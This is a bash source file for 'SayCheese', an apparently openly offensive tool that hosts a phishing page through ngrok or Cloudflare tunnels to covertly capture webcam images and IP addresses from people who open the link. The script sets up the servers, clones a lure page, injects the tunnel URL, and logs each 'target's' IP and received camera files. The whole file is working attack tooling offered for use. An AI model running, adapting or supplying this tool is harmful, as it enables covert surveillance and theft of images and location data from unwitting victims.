

#!/bin/bash
# SayCheese v1.0
# coded by: github.com/thelinuxchoice/saycheese
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {


printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
printf "\e[1;92m              |___/ \e[0m                                 \n"

printf " \e[1;77m v1.x? coded by github.com/f1gur4nt/saycheese\e[0m \n"
printf "\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
if [[ ! -f .monolith/monolith ]]; then
  arch=`uname -m`
  if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
    wget -q --show-progress --no-check-certificate "https://github.com/Y2Z/monolith/releases/download/v2.6.1/monolith-gnu-linux-armhf" -O .monolith/monolith
  elif [[ "$arch" == *'aarch64'* ]]; then
    wget -q --show-progress --no-check-certificate "https://github.com/Y2Z/monolith/releases/download/v2.6.1/monolith-gnu-linux-aarch64" -O .monolith/monolith
  elif [[ "$arch" == *'x86_64'* ]]; then
    wget -q --show-progress --no-check-certificate "https://github.com/Y2Z/monolith/releases/download/v2.6.1/monolith-gnu-linux-x86_64" -O .monolith/monolith
  fi
  mkdir .monolith 2> /dev/null &
  chmod +x .monolith/monolith
fi
if [[ ! -f .server/cloudflared ]]; then
  mkdir .server
  arch=`uname -m`
  echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
  if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
    wget -q --show-progress --no-check-certificate 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O .server/cloudflared
  elif [[ "$arch" == *'aarch64'* ]]; then
    wget -q --show-progress --no-check-certificate 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' -O .server/cloudflared
  elif [[ "$arch" == *'x86_64'* ]]; then
    wget -q --show-progress --no-check-certificate 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O .server/cloudflared
  else
    wget -q --show-progress --no-check-certificate 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' -O .server/cloudflared

  fi
  chmod +x .server/cloudflared
fi

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z\-]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 8080 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z\-]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi



start_cloud() {
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared server...\n"
  killall cloudflared
  rm .server/log.txt
  ./.server/cloudflared tunnel --logfile .server/log.txt > /dev/null 2>&1 &
  sleep 5
}

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Do you want custom template? [y/N]: \e[0m' templateyn

if [[ $templateyn = "y" ]]; then
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Url: \e[0m' templateurl
else
  sed 's+forwarding_link+'$cf'+g' saycheese.html > index2.html
fi
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 0.0.0.0:8080 > /dev/null 2>&1 &
if [[ $templateyn = "y" ]]; then
  .monolith/./monolith $templateurl -o .temp1.html
  python3 replace.py > index2.html
fi
sed 's+forwarding_link+''+g' template.php > index.php
sleep 2
checkfound
elif [[ $option_server -eq 2 ]]; then
if [[ $templateyn = "y" ]]; then
  .monolith/./monolith $templateurl -o .temp1.html
  python3 replace.py > index2.html
fi
ngrok_server
elif [[ $option_server -eq 3 ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2
start_cloud
if [[ $templateyn = "y" ]]; then
  .monolith/./monolith $templateurl -o .temp1.html
  python3 replace.py > index2.html
fi

cf=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .server/log.txt)
printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Url: '$cf'\e[0m\n'
sed 's+forwarding_link+''+g' template.php > index.php

sed 's+forwarding_link+'$cf'+g' saycheese.html > frame.html
checkfound
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


banner
dependencies
start1

